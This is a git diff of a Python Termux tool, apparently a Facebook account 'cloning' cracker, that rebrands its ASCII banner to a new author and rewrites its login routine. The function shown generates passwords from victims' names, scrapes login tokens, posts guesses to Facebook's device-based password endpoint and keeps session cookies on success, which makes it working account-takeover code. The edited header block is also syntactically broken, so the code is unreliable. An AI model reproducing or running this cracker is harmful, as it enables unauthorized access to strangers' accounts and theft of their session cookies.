@@ -10,7 +10,7 @@ os.system('git pull')
 os.system('clear')
 print('[\033[1;32m✓\033[1;37m] Update Done \033[1;32m✓\033[1;37m Now You Can Use This Tool :) ')
 time.sleep(2)
-os.system(f'xdg-open https://www.facebook.com/d4dy.SH4N7O ')
+#os.system(f'xdg-open https://www.facebook.com/d4dy.SH4N7O ')
 try:
         import os,requests,json,time,re,random,sys,uuid,string,subprocess
         from string import *
@@ -96,23 +96,21 @@ for agent in range(10000):
               
 os.system(f" clear")                          
 logo =("""          \033[1;37m____ \033[1;32m                       \033[1;37m____          
-███╗░░░███╗░█████╗░██╗░░██╗██╗███╗░░██╗
-████╗░████║██╔══██╗██║░░██║██║████╗░██║
-██╔████╔██║███████║███████║██║██╔██╗██║
-██║╚██╔╝██║██╔══██║██╔══██║██║██║╚████║
-██║░╚═╝░██║██║░░██║██║░░██║██║██║░╚███║
-╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝
-    
+
+        ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+        ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+        ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
+
             \033[1;37m \033[1;36m\033[1;37m═\033[44m\033[1;37m[ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐦𝐲 𝐰𝐨𝐫𝐥𝐝🌍 ]\x1b[0m═\033[1;36m\033[1;37m
     
-\033[1;37m╔\033[1;36m════\033[1;37m═══════════════════\033[1;36mMAHIN✯HRIDOYE\033[1;37m═════════════════\033[1;36m════\033[1;37m╗
+\033[1;37m╔\033[1;36m════\033[1;37m═══════════════════\033[1;36mHRIDOY✯SHANTO\033[1;37m═════════════════\033[1;36m════\033[1;37m╗
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ᴀᴜᴛʜᴏʀ]\033[1;31m  ➟  \033[1;32mD4DY-SH4N7O        \033[1;31m       │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ꜰᴀᴄᴇʙᴏᴏᴋ]\033[1;31m➟  \033[1;32mD4DY-SH4N7O         \033[1;31m      │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ɢɪᴛʜᴜʙ]\033[1;31m  ➟ \033[1;32m D4DY-SH4N7O                  \033[1;31m        │
-\033[1;31m│\033[1;37m [+]  \033[1;32m[ʏᴏᴜᴛᴜʙᴇ]\033[1;31m ➟  \033[1;32mMAHIN VAU                  \033[1;31m        │
-\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴠᴇʀꜱᴏɴ]\033[1;31m  ➟  \033[1;32m1.2                          \033[1;31m      │
+\033[1;31m│\033[1;37m [+]  \033[1;32m[ʏᴏᴜᴛᴜʙᴇ]\033[1;31m ➟  \033[1;32mSHANTO VAU                  \033[1;31m        │
+\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴠᴇʀꜱᴏɴ]\033[1;31m  ➟  \033[1;32m0.1                          \033[1;31m      │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ɢʀᴏᴜᴘ]\033[1;31m   ➟  \033[1;32m TERMUX COMMAND \033[1;37m {\033[1;36mSH4N7O\033[1;37m} \033[1;31m     │
-\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴡʜᴀᴛꜱᴀᴘᴘ]\033[1;31m➟  \033[1;32m01929974678\033[1;37m \033[1;36m \033[1;37m \033[1;31m                     │
+\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴡʜᴀᴛꜱᴀᴘᴘ]\033[1;31m➟  \033[1;32m0131*86*23*\033[1;37m \033[1;36m \033[1;37m \033[1;31m                     │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ɴᴇᴛᴡᴏʀᴋ]\033[1;31m ➟  \033[1;32m3G,4G,5G \033[1;37m {\033[1;36mON Mobile Data\033[1;37m} \033[1;31m        │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ᴄᴏɴᴛᴀᴄᴛ]\033[1;31m ➟  \033[1;32m😍😍😍😍😍😍😍\033[1;37m \033[1;36m\033[1;37m \033[1;31m │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ᴛᴏᴏʟꜱ]\033[1;31m   ➟  \033[1;32mFILE CLONING \033[1;37m  \033[1;31m                    │
@@ -214,10 +212,33 @@ def m1(ids,names,passlist):
                 for fikr in passlist:
                	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        head = {''authority': 'developer.facebook.com',
+    'x-fb-rlaf'r: '0',
+    'access-control-allow-origin': '*',
+    'facebook-api-version': 'v16.0',
+    'strict-transport-security': 'max-age=15552000',
+    'pragma': 'no-cache',
+    'cache-control': 'private, no-cache, no-store, must-revalidate',
+    'x-fb-request-id': 'AiGuLwCzPqnnTZJqFNYX5il',
+    'x-fb-trace-id': 'ASD9GTscEj+',
+    'x-fb-rev': '1007473661',
+    'x-fb-debug': 'pv2eabdEjYMQe8eRiKApjs+HxPUT1JBgTMnD6GZT1ycaT/rnfu/lUPAPeJpryC7JCs35kxgUyF5D0OafHSeqnA==',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1',
+}
+                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         SH4N7O=session.cookies.get_dict().keys()
                         if "c_user" in SH4N7O:
                                 coki=session.cookies.get_dict()
